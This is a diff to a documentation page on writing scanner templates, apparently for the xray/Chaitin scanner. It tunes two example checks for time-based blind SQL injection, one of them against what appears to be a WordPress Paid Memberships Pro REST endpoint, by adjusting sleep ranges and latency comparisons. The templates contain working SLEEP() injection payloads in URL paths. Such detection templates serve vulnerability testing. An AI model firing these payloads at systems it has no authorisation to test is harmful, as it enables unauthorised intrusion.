@@ -761,8 +761,8 @@ title: '编写模板'
     manual: true
     transport: http
     set:
-      sleepSecond1: randomInt(6, 8)
-      sleepSecond2: randomInt(3, 5)
+      sleepSecond1: randomInt(5, 8)
+      sleepSecond2: randomInt(2, 4)
     rules:
       r0:
         request:
@@ -778,14 +778,16 @@ title: '编写模板'
           method: GET
           read_timeout: "10"
           path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond1}}))))%23
-        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 1000 && response.body_string.contains("xxxx")
+        expression: response.latency - r0latency >= sleepSecond1 * 1000 && response.body_string.contains("xxxx")
+        output:
+          r1latency: response.latency
       r2:
         request:
           cache: true
           method: GET
           read_timeout: "10"
           path: /user/test.php?id=1%27)%20AND%20(SELECT(SELECT(SLEEP({{sleepSecond2}}))))%23
-        expression: response.latency - r0latency >= sleepSecond2 * 1000 - 1000 && response.body_string.contains("xxxx")
+        expression: response.latency - r0latency >= sleepSecond2 * 1000 && response.latency < r1latency && response.body_string.contains("xxxx")
     expression: r0() && r1() && r2()
     detail:
       author: test
@@ -798,7 +800,7 @@ title: '编写模板'
     manual: true
     transport: http
     set:
-      sleepSecond: randomInt(5, 7)
+      sleepSecond: randomInt(5, 8)
       sleepSecond1: randomInt(2, 4)
     rules:
       r0:
@@ -815,14 +817,16 @@ title: '编写模板'
           method: GET
           read_timeout: "10"
           path: /?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP({{sleepSecond}})))a)--%20-
-        expression: response.latency - r0latency >= sleepSecond * 1000 - 500
+        expression: response.latency - r0latency >= sleepSecond * 1000 - 100
+        output:
+          r1latency: response.latency
       r2:
         request:
           cache: true
           method: GET
           read_timeout: "10"
           path: /?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP({{sleepSecond1}})))a)--%20-
-        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 500
+        expression: response.latency - r0latency >= sleepSecond1 * 1000 - 100 && response.latency < r1latency
     expression: r0() && r1() && r2()
     detail:
       author: Chaitin
